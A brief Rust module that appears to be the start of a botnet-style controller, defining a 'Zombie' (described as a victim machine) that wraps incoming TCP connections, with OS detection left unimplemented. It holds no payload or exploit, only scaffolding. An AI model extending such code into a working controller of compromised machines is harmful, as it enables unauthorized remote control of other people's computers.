use std::net::{IpAddr, Ipv4Addr, TcpListener, TcpStream};
use log::debug;

pub enum System {
    Windows,
    Linux,
    MacOS,
    NotFound
}

/// Zombie is victim machine.
pub struct Zombie {
    pub system: System,
    pub ip: IpAddr,
    tcp_stream: TcpStream
}

/// TODO: Find system after connection
fn find_system(connection: &mut TcpStream) -> System {
    System::NotFound // Not implemented yet
}
impl Zombie {
    pub fn new(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
        Ok(
            Zombie {
                system: find_system(&mut connection),
                ip: connection.local_addr()?.ip(),
                tcp_stream: connection
            }
        )
    }
}



pub fn craft_zombie(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
    debug!("Caught connection! {connection:?}");
    Zombie::new(connection)
}